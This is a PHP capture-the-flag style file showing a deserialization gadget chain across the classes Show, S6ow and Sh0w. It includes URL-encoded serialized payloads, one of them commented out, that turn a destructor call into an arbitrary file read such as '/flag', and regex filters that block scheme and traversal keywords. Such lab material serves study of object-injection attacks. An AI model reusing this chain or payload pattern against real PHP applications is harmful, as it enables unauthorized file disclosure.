<?php

class Show
{
    public $source;
    public $str;

    public function __toString()
    {
        $text= $this->source;
        $text = base64_encode(file_get_contents($text));
        return $text;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|flag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class S6ow
{
    public $file;
    public $params;

    public function __get($key)
    {
        return $this->params[$key];
    }
    public function __call($name, $arguments)
    {
        if($this->{$name})
            $this->{$this->{$name}}($arguments);
    }
    public function file_get($value)
    {
        echo $this->file;
    }
}

class Sh0w
{
    public $test;
    public $str;

    public function __destruct()
    {
        $this->str->_show();        //__call()
    }
}

#unserialize(urldecode("O%3A4%3A%22Sh0w%22%3A2%3A%7Bs%3A4%3A%22test%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22S6ow%22%3A2%3A%7Bs%3A4%3A%22file%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A5%3A%22%2Fflag%22%3Bs%3A3%3A%22str%22%3BN%3B%7Ds%3A6%3A%22params%22%3Ba%3A1%3A%7Bs%3A5%3A%22_show%22%3Bs%3A8%3A%22file_get%22%3B%7D%7D%7D"));
unserialize(urldecode("O%3A4%3A%22Sh0w%22%3A2%3A%7Bs%3A4%3A%22test%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22S6ow%22%3A2%3A%7Bs%3A4%3A%22file%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BN%3B%7Ds%3A6%3A%22params%22%3Ba%3A1%3A%7Bs%3A5%3A%22_show%22%3Bs%3A8%3A%22file_get%22%3B%7D%7D%7D"));


